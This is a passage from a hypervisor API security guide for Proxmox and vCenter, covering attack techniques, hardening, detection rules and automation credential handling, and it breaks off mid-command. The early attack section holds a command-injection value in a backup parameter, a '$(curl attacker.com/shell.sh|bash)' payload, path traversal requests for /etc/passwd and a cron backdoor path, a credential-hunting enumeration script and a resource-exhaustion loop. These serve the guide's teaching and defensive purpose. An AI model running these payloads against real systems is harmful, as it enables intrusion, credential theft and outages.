# Proxmox backup API — vzdump command construction
# If VM notes or backup options are not sanitized:
curl -k -X POST "https://proxmox.target.local:8006/api2/json/nodes/pve1/vzdump" \
  -H "Authorization: PVEAPIToken=user@pve!token=secret" \
  -d "vmid=100&compress=zstd&mailto=admin@corp.local;id>/tmp/pwned"
  # ^ If 'mailto' is passed unsanitized to a mail command
```

**vCenter task descriptions and custom attributes:**
```python
# If custom attribute values are rendered in contexts that execute code:
# (e.g., report generation, webhook templates)
payload = "$(curl attacker.com/shell.sh|bash)"
# Set as VM annotation or custom attribute via API
```

### 5.4 Deserialization Vulnerabilities in SOAP APIs

The vSphere SOAP API (Java-based) has historically been vulnerable to deserialization attacks:

```python
#!/usr/bin/env python3
"""
Java deserialization test against vCenter SOAP endpoint
Tests if the endpoint deserializes untrusted Java objects
"""
import requests

VCENTER = "https://vcenter.target.local"

# Crafted SOAP envelope with serialized Java object in unexpected field
# ysoserial-generated payloads for common gadget chains
soap_payload = """<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:vim25="urn:vim25">
  <soapenv:Header>
    <!-- Serialized object in SOAP header — tests if server deserializes headers -->
    <vim25:operationID>{payload_placeholder}</vim25:operationID>
  </soapenv:Header>
  <soapenv:Body>
    <vim25:RetrieveServiceContent>
      <vim25:_this type="ServiceInstance">ServiceInstance</vim25:_this>
    </vim25:RetrieveServiceContent>
  </soapenv:Body>
</soapenv:Envelope>"""

resp = requests.post(
    f"{VCENTER}/sdk",
    data=soap_payload,
    headers={"Content-Type": "text/xml; charset=utf-8",
             "SOAPAction": "urn:vim25/7.0"},
    verify=False
)
print(f"Response: {resp.status_code}")
# Analyze response for deserialization error messages indicating processing occurred
```

### 5.5 Path Traversal Through File Management APIs

Both vCenter and Proxmox expose file management through their APIs:

```bash
# vCenter datastore file browser — path traversal test
curl -k "https://vcenter.target.local/folder/../../../etc/passwd?dcPath=Datacenter&dsName=datastore1" \
  -H "vmware-api-session-id: $SESSION"

# Proxmox file download from storage — parameter manipulation
curl -k "https://proxmox.target.local:8006/api2/json/nodes/pve1/storage/local/content" \
  -H "Authorization: PVEAPIToken=user@pve!token=secret"

# Attempt to access files outside intended storage path
curl -k -X POST "https://proxmox.target.local:8006/api2/json/nodes/pve1/storage/local/upload" \
  -H "Authorization: PVEAPIToken=user@pve!token=secret" \
  -F "filename=../../../../etc/cron.d/backdoor" \
  -F "content=iso"
```

### 5.6 Mass Data Extraction Through API Enumeration

An authenticated attacker can rapidly extract the entire virtual infrastructure inventory:

```python
#!/usr/bin/env python3
"""
Proxmox infrastructure enumeration — demonstrates data exposure risk
from a single compromised API token with read permissions.
"""
import requests
import json
requests.packages.urllib3.disable_warnings()

PROXMOX = "https://proxmox.target.local:8006"
HEADERS = {"Authorization": "PVEAPIToken=auditor@pve!audit=token-value"}

def api_get(path: str) -> dict:
    resp = requests.get(f"{PROXMOX}/api2/json{path}", headers=HEADERS, verify=False)
    return resp.json().get("data", {}) if resp.status_code == 200 else {}

# Enumerate entire infrastructure
print("=== CLUSTER STATUS ===")
cluster = api_get("/cluster/status")
print(json.dumps(cluster, indent=2))

print("\n=== NODES ===")
nodes = api_get("/nodes")
for node in nodes:
    node_name = node["node"]
    print(f"\n--- Node: {node_name} ---")

    # All VMs on this node
    vms = api_get(f"/nodes/{node_name}/qemu")
    for vm in vms:
        vmid = vm["vmid"]
        print(f"  VM {vmid}: {vm.get('name', 'unnamed')} [{vm.get('status')}]")

        # VM configuration (may contain credentials)
        config = api_get(f"/nodes/{node_name}/qemu/{vmid}/config")
        # Cloud-init configs often contain passwords
        if "cipassword" in str(config):
            print(f"    [!] Cloud-init password found in VM {vmid} config!")
        if "sshkeys" in config:
            print(f"    [!] SSH keys found in VM {vmid} config")

    # Network configuration
    networks = api_get(f"/nodes/{node_name}/network")
    print(f"  Networks: {[n['iface'] for n in networks]}")

    # Storage
    storage = api_get(f"/nodes/{node_name}/storage")
    print(f"  Storage: {[s['storage'] for s in storage]}")

print("\n=== USERS AND TOKENS ===")
users = api_get("/access/users")
for user in users:
    print(f"  {user['userid']} | enabled={user.get('enable', 1)} | expire={user.get('expire', 'never')}")
```

### 5.7 Denial of Service Through Resource-Intensive API Calls

```bash
# Fork bomb via API — create many VMs simultaneously
for i in $(seq 1 100); do
  curl -k -X POST "https://proxmox.target.local:8006/api2/json/nodes/pve1/qemu" \
    -H "Authorization: PVEAPIToken=user@pve!token=secret" \
    -d "vmid=$((9000+i))&memory=65536&cores=32&name=dos-$i" &
done
# Exhausts: task queue, storage IOPS (thin provisioning), memory allocation

# vCenter: trigger expensive PropertyCollector queries
# RetrievePropertiesEx with extremely broad filters on large inventories
# can consume significant vCenter CPU and memory
```

---

## 6. API Hardening

### 6.1 Authentication Hardening

**Multi-Factor Authentication for API Access:**

```bash
# Proxmox: Enable TOTP for a user
pveum user modify admin@pve --keys "v2-totp-sha1-... "

# vCenter: Configure RSA SecurID / DUO / FIDO2
# Via vCenter SSO configuration → Identity Sources → Smart Card Authentication

# For API tokens: MFA cannot protect stateless tokens directly
# Mitigation: short-lived tokens + IP restriction + privileged operation alerting
```

**Short-Lived Token Policy:**

```bash
# Proxmox: Create token with 8-hour expiry
pveum user token add cicd@pve pipeline \
  --expire $(date -d "+8 hours" +%s) \
  --privsep 1

# Automated token rotation script
#!/bin/bash
# Run via cron every 6 hours
OLD_TOKEN=$(cat /etc/automation/pve-token)
NEW_TOKEN=$(pvesh create /access/users/cicd@pve/token/pipeline \
  --expire $(date -d "+8 hours" +%s) --privsep 1 \
  --output-format json | jq -r '.data.value')
echo "$NEW_TOKEN" > /etc/automation/pve-token
chmod 600 /etc/automation/pve-token
# Update Terraform/Ansible credential store
vault kv put secret/proxmox token="$NEW_TOKEN"
```

**IP Restriction:**

```bash
# Proxmox: restrict API access by source IP via firewall
# /etc/pve/firewall/cluster.fw
[RULES]
IN ACCEPT -source 10.0.100.0/24 -dest +proxmox -p tcp -dport 8006 -log info
IN DROP -dest +proxmox -p tcp -dport 8006 -log warning

# vCenter: restrict API access via distributed firewall rules
# Or configure rhttpproxy allowlist
```

### 6.2 Authorization — Least Privilege for API Tokens

**Proxmox token scoping example:**

```bash
# Create a minimal monitoring token
pveum user add monitor@pve --password "$(openssl rand -base64 24)"
pveum role add PVEMonitorOnly --privs "VM.Audit,Sys.Audit,Datastore.Audit,SDN.Audit"
pveum acl modify / --users monitor@pve --roles PVEMonitorOnly
pveum user token add monitor@pve metrics --privsep 1 --expire $(date -d "+30 days" +%s)
pveum acl modify / --tokens 'monitor@pve!metrics' --roles PVEMonitorOnly

# Create a minimal backup token
pveum role add PVEBackupOnly --privs "VM.Backup,Datastore.AllocateSpace,Datastore.Audit"
pveum user add backup@pve --password "$(openssl rand -base64 24)"
pveum acl modify / --users backup@pve --roles PVEBackupOnly
pveum user token add backup@pve nightly --privsep 1

# Create a CI/CD token limited to specific VMs
pveum role add CICDDeploy --privs "VM.Config.Disk,VM.Config.Network,VM.PowerMgmt,VM.Console"
pveum user add cicd@pve --password "$(openssl rand -base64 24)"
pveum acl modify /vms/200 --users cicd@pve --roles CICDDeploy
pveum acl modify /vms/201 --users cicd@pve --roles CICDDeploy
pveum user token add cicd@pve deploy --privsep 1
pveum acl modify /vms/200 --tokens 'cicd@pve!deploy' --roles CICDDeploy
pveum acl modify /vms/201 --tokens 'cicd@pve!deploy' --roles CICDDeploy
```

**vCenter role engineering:**

```powershell
# PowerCLI: Create minimal custom role for automation
$privs = @(
    "VirtualMachine.Interact.PowerOn",
    "VirtualMachine.Interact.PowerOff",
    "VirtualMachine.State.CreateSnapshot",
    "VirtualMachine.State.RemoveSnapshot",
    "VirtualMachine.Config.Annotation"
)
New-VIRole -Name "AutomationMinimal" -Privilege (Get-VIPrivilege -Id $privs)

# Assign to service account on specific folder only
$folder = Get-Folder -Name "CI-VMs"
$user = "CORP\svc-automation"
New-VIPermission -Entity $folder -Principal $user -Role "AutomationMinimal" -Propagate $true
```

### 6.3 Input Validation

**Parameter validation checklist for API endpoints:**

| Validation Type | Example | Purpose |
|-----------------|---------|---------|
| Type checking | `vmid` must be integer 100-999999999 | Prevent injection |
| Length limits | VM name max 63 chars | Prevent buffer issues |
| Character allowlist | VM name: `[a-zA-Z0-9._-]` | Prevent special char injection |
| Encoding validation | UTF-8 only, reject null bytes | Prevent encoding attacks |
| Range validation | Memory: 64MB-16TB | Prevent resource exhaustion |
| Path canonicalization | Resolve `../` before access check | Prevent traversal |

### 6.4 Rate Limiting Implementation

**Nginx reverse proxy rate limiting for Proxmox:**

```nginx
# /etc/nginx/conf.d/proxmox-ratelimit.conf
# Place nginx in front of pveproxy for advanced rate limiting

limit_req_zone $binary_remote_addr zone=api_general:10m rate=30r/s;
limit_req_zone $binary_remote_addr zone=api_auth:10m rate=3r/m;
limit_req_zone $http_authorization zone=api_per_token:10m rate=60r/s;
limit_conn_zone $binary_remote_addr zone=api_conn:10m;

upstream pveproxy {
    server 127.0.0.1:8006;
}

server {
    listen 443 ssl;
    server_name proxmox.corp.local;

    ssl_certificate /etc/pve/local/pveproxy-ssl.pem;
    ssl_certificate_key /etc/pve/local/pveproxy-ssl.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';

    # Authentication endpoint — strict rate limit
    location /api2/json/access/ticket {
        limit_req zone=api_auth burst=5 nodelay;
        limit_conn api_conn 5;
        proxy_pass https://pveproxy;
    }

    # General API — moderate rate limit
    location /api2/ {
        limit_req zone=api_general burst=50 nodelay;
        limit_conn api_conn 20;
        proxy_pass https://pveproxy;
    }

    # Deny direct access to internal paths
    location /api2/json/nodes/*/execute {
        deny all;
        return 403;
    }
}
```

### 6.5 TLS Hardening — Mutual TLS for API Access

**Mutual TLS (mTLS) configuration for Proxmox API:**

```bash
# Generate CA for API client certificates
openssl genrsa -out /etc/pve/priv/api-ca.key 4096
openssl req -new -x509 -key /etc/pve/priv/api-ca.key \
  -out /etc/pve/api-ca.crt -days 3650 \
  -subj "/CN=Proxmox API Client CA/O=Corp"

# Generate client certificate for automation
openssl genrsa -out /etc/automation/client.key 2048
openssl req -new -key /etc/automation/client.key \
  -out /etc/automation/client.csr \
  -subj "/CN=terraform-automation/O=Corp/OU=DevOps"
openssl x509 -req -in /etc/automation/client.csr \
  -CA /etc/pve/api-ca.crt -CAkey /etc/pve/priv/api-ca.key \
  -CAcreateserial -out /etc/automation/client.crt -days 365

# Configure nginx (reverse proxy) to require client certificate
# In the server block:
ssl_client_certificate /etc/pve/api-ca.crt;
ssl_verify_client on;
ssl_verify_depth 2;
```

**Client usage with mTLS:**

```bash
# curl with client certificate
curl --cert /etc/automation/client.crt \
     --key /etc/automation/client.key \
     --cacert /etc/pve/api-ca.crt \
     "https://proxmox.corp.local:8006/api2/json/cluster/status" \
     -H "Authorization: PVEAPIToken=automation@pve!terraform=token-value"
```

### 6.6 API Versioning Security

```bash
# Proxmox API versioning — check supported versions
curl -k "https://proxmox.lab.local:8006/api2/json/version"
# Response: {"data":{"version":"8.2.4","release":"8.2","repoid":"..."}}

# vCenter REST API versioning
curl -k "https://vcenter.lab.local/api"
# Lists available API versions and endpoints

# Security concern: deprecated API versions may lack security fixes
# Enforcement: disable older API versions in reverse proxy
location ~ /api2/extjs/ {
    # Legacy ExtJS API format — disable if not needed
    deny all;
}
```

---

## 7. API Monitoring and Detection

### 7.1 API Audit Logging — What to Log, Retention, Integrity

**Proxmox audit logging configuration:**

```bash
# Proxmox logs API access to syslog via pveproxy/pvedaemon
# Default: /var/log/pveproxy/access.log (Apache-style)
# Authentication events: /var/log/auth.log and journalctl

# Enhanced logging via rsyslog
# /etc/rsyslog.d/50-pve-api-audit.conf
:programname, isequal, "pvedaemon" /var/log/pve-api-audit.log
:programname, isequal, "pveproxy" /var/log/pve-api-access.log
& stop

# Log format includes: timestamp, source IP, user, method, path, status
# Example entry:
# 2026-05-07T14:23:01+00:00 pve1 pvedaemon[1234]: successful auth for user 'root@pam' from 10.0.100.50
# 2026-05-07T14:23:02+00:00 pve1 pveproxy[1235]: 10.0.100.50 - root@pam [07/May/2026:14:23:02 +0000] "POST /api2/json/nodes/pve1/qemu/100/status/start HTTP/1.1" 200 123

# Log integrity protection with AIDE
aide --init
# /etc/aide/aide.conf:
/var/log/pve-api-audit.log p+i+n+u+g+s+sha256
```

**vCenter API audit logging:**

```bash
# vCenter logs API operations to vpxd.log
# Location: /var/log/vmware/vpxd/vpxd.log (VCSA)

# Enable verbose API logging (performance impact — use temporarily)
# Via VAMI or:
vim-cmd internalsvc/logconfig set vpxd verbose

# Syslog forwarding for vCenter
# /etc/vmware-syslog/syslog.conf:
*.* @siem.corp.local:514;RSYSLOG_SyslogProtocol23Format
```

**What to log (minimum for security):**

| Event Category | Fields | Retention |
|---------------|--------|-----------|
| Authentication success/failure | timestamp, user, source_ip, method | 1 year |
| Privilege changes | timestamp, actor, target, old_role, new_role | 2 years |
| VM lifecycle (create/delete/clone) | timestamp, user, vmid, operation | 1 year |
| Configuration changes | timestamp, user, object, old_value, new_value | 2 years |
| Console access | timestamp, user, vmid, duration | 1 year |
| Token creation/revocation | timestamp, actor, token_id, permissions | 2 years |
| Failed operations | timestamp, user, operation, error, source_ip | 1 year |

### 7.2 Anomaly Detection

**Detection rules for API abuse:**

```yaml
# Sigma rule: Brute force against Proxmox API
title: Proxmox API Brute Force Attempt
status: experimental
logsource:
  product: proxmox
  service: auth
detection:
  selection:
    EventType: "authentication failure"
  timeframe: 5m
  condition: selection | count(src_ip) > 10
level: high
tags:
  - attack.credential_access
  - attack.t1110

---
# Sigma rule: Unusual API volume from single token
title: Proxmox API Token Abuse - High Volume
status: experimental
logsource:
  product: proxmox
  service: access
detection:
  selection:
    http_method:
      - POST
      - PUT
      - DELETE
  timeframe: 1m
  condition: selection | count(authorization_token) > 50
level: medium
tags:
  - attack.execution
  - attack.t1106

---
# Sigma rule: Off-hours API administrative access
title: Proxmox Admin API Access Outside Business Hours
status: experimental
logsource:
  product: proxmox
  service: access
detection:
  selection:
    user|endswith: "@pam"
    http_path|contains: "/api2/json/access/"
  filter_business_hours:
    timestamp|time: ">=08:00 AND <=18:00"
  condition: selection AND NOT filter_business_hours
level: medium
```

### 7.3 SIEM Integration

**Forwarding Proxmox API logs to Elasticsearch/Wazuh:**

```yaml
# Filebeat configuration for Proxmox API logs
# /etc/filebeat/filebeat.yml
filebeat.inputs:
  - type: log
    enabled: true
    paths:
      - /var/log/pve-api-audit.log
      - /var/log/pve-api-access.log
    fields:
      log_type: proxmox_api
    multiline:
      pattern: '^\d{4}-\d{2}-\d{2}'
      negate: true
      match: after

  - type: journald
    enabled: true
    units:
      - pvedaemon.service
      - pveproxy.service
    fields:
      log_type: proxmox_service

output.elasticsearch:
  hosts: ["https://siem.corp.local:9200"]
  protocol: "https"
  ssl.certificate_authorities: ["/etc/filebeat/ca.crt"]
  username: "filebeat_writer"
  password: "${FILEBEAT_ES_PASSWORD}"
  index: "proxmox-api-%{+yyyy.MM.dd}"

processors:
  - dissect:
      tokenizer: '%{timestamp} %{host} %{process}[%{pid}]: %{message}'
      field: "message"
      target_prefix: "pve"
  - geoip:
      field: "pve.source_ip"
      target_field: "geo"
```

**Wazuh rules for Proxmox API monitoring:**

```xml
<!-- /var/ossec/etc/rules/proxmox_api_rules.xml -->
<group name="proxmox,api,">
  <rule id="100100" level="5">
    <decoded_as>proxmox_auth</decoded_as>
    <match>authentication failure</match>
    <description>Proxmox API authentication failure</description>
    <group>authentication_failed,</group>
  </rule>

  <rule id="100101" level="10" frequency="5" timeframe="120">
    <if_matched_sid>100100</if_matched_sid>
    <same_source_ip />
    <description>Proxmox API brute force detected (5+ failures in 2 minutes)</description>
    <group>authentication_failures,</group>
  </rule>

  <rule id="100102" level="12">
    <decoded_as>proxmox_api</decoded_as>
    <match>DELETE /api2/json/nodes</match>
    <description>Proxmox API: Node deletion attempted</description>
    <group>critical_operation,</group>
  </rule>

  <rule id="100103" level="10">
    <decoded_as>proxmox_api</decoded_as>
    <regex>POST /api2/json/access/users/.+/token</regex>
    <description>Proxmox API: New API token created</description>
    <group>privilege_change,</group>
  </rule>
</group>
```

### 7.4 Detecting API Abuse Patterns

**Python-based API anomaly detector:**

```python
#!/usr/bin/env python3
"""
Real-time API anomaly detection for Proxmox.
Monitors pveproxy access log and alerts on suspicious patterns.
"""
import re
import time
import subprocess
from collections import defaultdict, deque
from dataclasses import dataclass
from datetime import datetime, timedelta

@dataclass
class APIEvent:
    timestamp: datetime
    source_ip: str
    user: str
    method: str
    path: str
    status: int

# Thresholds
AUTH_FAILURE_THRESHOLD = 5  # per IP per 5 minutes
REQUEST_RATE_THRESHOLD = 100  # per token per minute
ENUMERATION_THRESHOLD = 20  # unique VM config reads per minute
OFF_HOURS_START = 22  # 10 PM
OFF_HOURS_END = 6  # 6 AM

# State
auth_failures: dict[str, deque] = defaultdict(deque)
request_rates: dict[str, deque] = defaultdict(deque)
enum_tracking: dict[str, set] = defaultdict(set)

LOG_PATTERN = re.compile(
    r'(?P<ip>[\d.]+) - (?P<user>\S+) \[(?P<ts>[^\]]+)\] '
    r'"(?P<method>\w+) (?P<path>\S+) HTTP/[\d.]+" (?P<status>\d+)'
)

def parse_log_line(line: str) -> APIEvent | None:
    match = LOG_PATTERN.search(line)
    if not match:
        return None
    return APIEvent(
        timestamp=datetime.strptime(match.group("ts"), "%d/%b/%Y:%H:%M:%S %z"),
        source_ip=match.group("ip"),
        user=match.group("user"),
        method=match.group("method"),
        path=match.group("path"),
        status=int(match.group("status"))
    )

def check_anomalies(event: APIEvent) -> list[str]:
    alerts = []
    now = event.timestamp

    # Brute force detection
    if event.status == 401:
        auth_failures[event.source_ip].append(now)
        # Trim old entries
        while auth_failures[event.source_ip] and \
              (now - auth_failures[event.source_ip][0]).seconds > 300:
            auth_failures[event.source_ip].popleft()
        if len(auth_failures[event.source_ip]) >= AUTH_FAILURE_THRESHOLD:
            alerts.append(
                f"[CRITICAL] Brute force: {event.source_ip} — "
                f"{len(auth_failures[event.source_ip])} failures in 5 minutes"
            )

    # Off-hours admin access
    hour = event.timestamp.hour
    if (hour >= OFF_HOURS_START or hour < OFF_HOURS_END):
        if "pam" in event.user and event.method in ("POST", "PUT", "DELETE"):
            alerts.append(
                f"[HIGH] Off-hours admin API access: {event.user} from "
                f"{event.source_ip} — {event.method} {event.path}"
            )

    # Enumeration detection
    if "/config" in event.path and event.method == "GET":
        enum_tracking[event.source_ip].add(event.path)
        if len(enum_tracking[event.source_ip]) >= ENUMERATION_THRESHOLD:
            alerts.append(
                f"[HIGH] API enumeration: {event.source_ip} accessed "
                f"{len(enum_tracking[event.source_ip])} unique VM configs"
            )

    return alerts

def monitor():
    """Tail the access log and analyze in real-time."""
    proc = subprocess.Popen(
        ["tail", "-F", "/var/log/pveproxy/access.log"],
        stdout=subprocess.PIPE, text=True
    )
    print("[*] API anomaly monitor started")
    for line in proc.stdout:
        event = parse_log_line(line.strip())
        if event:
            alerts = check_anomalies(event)
            for alert in alerts:
                print(alert)
                # In production: send to SIEM, trigger webhook, block IP

if __name__ == "__main__":
    monitor()
```

### 7.5 Automated Alerting and Response

```bash
# Automated response: block IP after brute force detection
# /etc/fail2ban/action.d/proxmox-api-block.conf
[Definition]
actionban = pvesh create /cluster/firewall/rules \
  --action drop --type in --source <ip> --enable 1 \
  --comment "Auto-blocked: API brute force at %(bantime)s"
actionunban = pvesh set /cluster/firewall/rules/<ruleid> --enable 0

# Webhook alert to operations channel
#!/bin/bash
# /usr/local/bin/api-alert.sh
send_alert() {
    local severity="$1" message="$2"
    curl -s -X POST "https://hooks.slack.corp.local/services/WEBHOOK" \
      -H "Content-Type: application/json" \
      -d "{\"text\":\"[$severity] Proxmox API Security: $message\"}"
}
```

---

## 8. Automation Security

### 8.1 Terraform Provider Security

**Proxmox Terraform provider credential management:**

```hcl
# WRONG: credentials in Terraform configuration
provider "proxmox" {
  pm_api_url      = "https://proxmox.corp.local:8006/api2/json"
  pm_user         = "terraform@pve!automation"
  pm_api_token_secret = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"  # NEVER DO THIS
  pm_tls_insecure = true  # NEVER IN PRODUCTION
}

# CORRECT: credentials from environment variables
provider "proxmox" {
  pm_api_url      = "https://proxmox.corp.local:8006/api2/json"
  pm_user         = var.pm_user  # From TF_VAR_pm_user environment variable
  pm_api_token_secret = var.pm_token  # From TF_VAR_pm_token
  pm_tls_insecure = false
}

# BEST: HashiCorp Vault dynamic credentials
data "vault_generic_secret" "proxmox" {
  path = "secret/data/infrastructure/proxmox"
}

provider "proxmox" {
  pm_api_url          = "https://proxmox.corp.local:8006/api2/json"
  pm_user             = data.vault_generic_secret.proxmox.data["token_id"]
  pm_api_token_secret = data.vault_generic_secret.proxmox.data["token_secret"]
  pm_tls_insecure     = false
}
```

**Terraform state file protection:**

```hcl
# State file contains ALL resource attributes including secrets
# NEVER store state locally in shared environments

# Remote backend with encryption
terraform {
  backend "s3" {
    bucket         = "corp-terraform-state"
    key            = "proxmox/production/terraform.tfstate"
    region         = "eu-central-1"
    encrypt        = true
    kms_key_id     = "arn:aws:kms:eu-central-1:123456789:key/abcd-1234"
    dynamodb_table = "terraform-locks"
  }
}

# State access control:
# - S3 bucket policy restricts to CI/CD role only
# - KMS key policy limits decrypt to specific IAM roles
# - DynamoDB table prevents concurrent state modification
# - Versioning enabled for state file recovery
```

**State file security audit:**

```bash
# Check if state file contains sensitive values
terraform show -json | python3 -c "
import json, sys
state = json.load(sys.stdin)
sensitive_patterns = ['password', 'secret', 'token', 'key', 'credential']
for resource in state.get('values', {}).get('root_module', {}).get('resources', []):
    for attr, value in resource.get('values', {}).items():
        if any(p in attr.lower() for p in sensitive_patterns):
            print(f'[WARN] {resource[\"address\"]}.{attr} may contain secrets')
"
```

### 8.2 Ansible Module Security

**Proxmox Ansible collection — secure credential handling:**

```yaml
# WRONG: plaintext credentials in playbook
- hosts: localhost
  tasks:
    - community.general.proxmox_kvm:
        api_host: proxmox.corp.local
        api_user: automation@pve
        api_password: "PlaintextPassword!"  # NEVER
        node: pve1
        name: web-server
        state: present

# CORRECT: Ansible Vault encrypted variables
# ansible-vault encrypt_string 'token-value' --name 'proxmox_token_secret'
- hosts: localhost
  vars_files:
    - vault/proxmox_credentials.yml  # Vault-encrypted
  tasks:
    - community.general.proxmox_kvm:
        api_host: "{{ proxmox_api_host }}"
        api_user: "{{ proxmox_api_user }}"
        api_token_id: "{{ proxmox_token_id }}"
        api_token_secret: "{{ proxmox_token_secret }}"
        validate_certs: true
        node: pve1
        name: web-server
        state: present

# BEST: External credential lookup
- hosts: localhost
  vars:
    proxmox_creds: "{{ lookup('hashi_vault', 'secret/data/proxmox') }}"
  tasks:
    - community.general.proxmox_kvm:
        api_host: proxmox.corp.local
        api_token_id: "{{ proxmox_creds.token_id }}"
        api_token_secret: "{{ proxmox_creds.token_secret }}"
        validate_certs: true
        node: pve1
        name: web-server
        state: present
```

**Ansible Vault best practices:**

```bash
# Create vault password file (permissions 600, not in git)
openssl rand -base64 32 > ~/.vault_password
chmod 600 ~/.vault_password

# Encrypt credential file
ansible-vault create --vault-password-file ~/.vault_password \
  vault/proxmox_credentials.yml

# ansible.cfg — never prompt, use file
[defaults]
vault_password_file = ~/.vault_password

# .gitignore — MANDATORY
.vault_password
*.retry
vault/decrypted_*
```

### 8.3 Packer Template Security

```hcl
# Packer template for Proxmox — secure credential handling
packer {
  required_plugins {
    proxmox = {
      source  = "github.com/hashicorp/proxmox"
      version = "~> 1.1"  # Pin version
    }
  }
}

variable "proxmox_token" {
  type      = string
  sensitive = true  # Prevents logging
}

source "proxmox-iso" "ubuntu-base" {
  proxmox_url              = "https://proxmox.corp.local:8006/api2/json"
  username                 = "packer@pve!templates"
  token                    = var.proxmox_token
  insecure_skip_tls_verify = false  # ALWAYS false in production

  node     = "pve1"
  vm_id    = 9000
  vm_name  = "ubuntu-24.04-base"
  template = true

  # Boot command — avoid embedding secrets
  boot_command = [
    "<wait5>",
    "autoinstall ds=nocloud-net;s=http://{{ .HTTPIP }}:{{ .HTTPPort }}/",
    "<enter>"
  ]

  # HTTP directory for cloud-init (no secrets in preseed)
  http_directory = "http"

  ssh_username = "packer"
  ssh_private_key_file = "~/.ssh/packer_ed25519"  # Key-based, not password
  ssh_timeout  = "30m"
}

build {
  sources = ["source.proxmox-iso.ubuntu-base"]

  # Provisioner — cleanup secrets before template finalization
  provisioner "shell" {
    inline = [
      "sudo cloud-init clean --logs",
      "sudo rm -rf /tmp/* /var/tmp/*",
      "sudo truncate -s 0 /etc/machine-id",
      "sudo rm -f /etc/ssh/ssh_host_*",  # Regenerated on first boot
      "history -c"
    ]
  }
}
```

### 8.4 CI/CD Pipeline Security for Infrastructure Automation

```yaml
# GitLab CI — secure Proxmox infrastructure pipeline
# .gitlab-ci.yml

variables:
  TF_ROOT: "${CI_PROJECT_DIR}/terraform/proxmox"
  # Secrets injected via GitLab CI/CD Variables (masked + protected)
  # PROXMOX_API_TOKEN_ID — masked variable
  # PROXMOX_API_TOKEN_SECRET — masked + file variable

stages:
  - validate
  - plan
  - apply

.terraform_base:
  image: hashicorp/terraform:1.8
  before_script:
    - cd ${TF_ROOT}
    - terraform init -backend-config="access_key=${AWS_ACCESS_KEY_ID}"

validate:
  extends: .terraform_base
  stage: validate
  script:
    - terraform validate
    - terraform fmt -check
    # Security scan of Terraform code
    - tfsec . --minimum-severity HIGH
    # Check for hardcoded secrets
    - trufflehog filesystem --directory . --only-verified
  rules:
    - if: $CI_MERGE_REQUEST_IID

plan:
  extends: .terraform_base
  stage: plan
  script:
    - terraform plan -out=tfplan -input=false
    # Convert plan to JSON for policy checking
    - terraform show -json tfplan > plan.json
    # OPA policy check — no overprivileged resources
    - conftest test plan.json --policy policies/
  artifacts:
    paths:
      - ${TF_ROOT}/tfplan
    expire_in: 1 hour
  rules:
    - if: $CI_MERGE_REQUEST_IID

apply:
  extends: .terraform_base
  stage: apply
  script:
    - terraform apply -input=false tfplan
  dependencies:
    - plan
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: manual  # Require manual approval for infrastructure changes
  environment:
    name: production
    deployment_tier: production
```

**Runner isolation for infrastructure pipelines:**

```yaml
# Runner must be:
# 1. Dedicated to infrastructure jobs (not shared with application builds)
# 2. Running in a hardened VM/container with minimal tools
# 3. Network-restricted to only reach Proxmox API and state backend
# 4. Ephemeral — destroyed after each job (no credential persistence)

# .gitlab-ci.yml runner selection
apply:
  tags:
    - infrastructure
    - privileged-network
    - ephemeral
```

### 8.5 GitOps Security — ArgoCD and Flux Credential Management

```yaml
# ArgoCD — managing Proxmox infrastructure declarations
# Secret management via Sealed Secrets or External Secrets Operator

# external-secret.yaml — pulls from Vault into Kubernetes Secret
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: proxmox-credentials
  namespace: argocd
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-backend
    kind: ClusterSecretStore
  target:
    name: proxmox-credentials
    template:
      type: Opaque
      data:
        PROXMOX_API_TOKEN_ID: "{{ .token_id }}"
        PROXMOX_API_TOKEN_SECRET: "{{ .token_secret }}"
  data:
    - secretKey: token_id
      remoteRef:
        key: secret/data/infrastructure/proxmox
        property: token_id
    - secretKey: token_secret
      remoteRef:
        key: secret/data/infrastructure/proxmox
        property: token_secret
```

---

## 9. API Penetration Testing

### 9.1 Methodology for Hypervisor API Testing

**Phase-based approach:**

```
Phase 1: Reconnaissance
├── Identify all API endpoints (port scan, documentation)
├── Determine API version and technology stack
├── Enumerate authentication methods
└── Map API surface from documentation/OpenAPI spec

Phase 2: Authentication Testing
├── Default credential testing
├── Brute force resistance
├── Token generation analysis (entropy, predictability)
├── Session management (timeout, invalidation, fixation)
└── Multi-factor bypass attempts

Phase 3: Authorization Testing
├── Horizontal privilege escalation (access other users' resources)
├── Vertical privilege escalation (gain higher privileges)
├── IDOR (Insecure Direct Object Reference) on VMIDs
├── Token scope bypass (privsep enforcement)
└── Path-based ACL bypass

Phase 4: Input Validation Testing
├── Injection (SQL, OS command, LDAP, template)
├── Path traversal
├── XXE (XML External Entity) for SOAP endpoints
├── Deserialization attacks
└── Parameter pollution

Phase 5: Business Logic Testing
├── Race conditions in VM operations
├── Workflow bypass (skip approval steps)
├── Resource exhaustion
└── State manipulation

Phase 6: Documentation & Reporting
├── Evidence collection (requests/responses)
├── CVSS scoring per finding
├── Remediation recommendations
└── Retesting verification
```

### 9.2 Tools for API Testing

**Burp Suite configuration for hypervisor APIs:**

```
# Burp Suite Project Options for Proxmox API testing

## Target Scope
- Include: https://proxmox.target.local:8006/api2/*
- Exclude: https://proxmox.target.local:8006/api2/json/access/ticket (avoid lockout)

## Session Handling Rules
1. Rule: "Proxmox API Auth"
   - Scope: Target scope
   - Action: Run macro "Get PVE Ticket"
   - Trigger: When response is 401

## Macro: "Get PVE Ticket"
1. POST /api2/json/access/ticket
   - Parameters: username=pentester@pve, password=<from credential store>
2. Extract: $.data.ticket → session variable "pve_ticket"
3. Extract: $.data.CSRFPreventionToken → session variable "csrf_token"

## Match/Replace Rules
- Add Cookie: PVEAuthCookie={pve_ticket}
- Add Header: CSRFPreventionToken: {csrf_token}
```

**httpie for interactive API testing:**

```bash
# httpie — more readable than curl for API testing

# Authenticate
http --verify=no POST https://proxmox.lab.local:8006/api2/json/access/ticket \
  username=pentester@pve password=TestPass123

# Use session (httpie sessions persist cookies)
http --verify=no --session=proxmox \
  POST https://proxmox.lab.local:8006/api2/json/access/ticket \
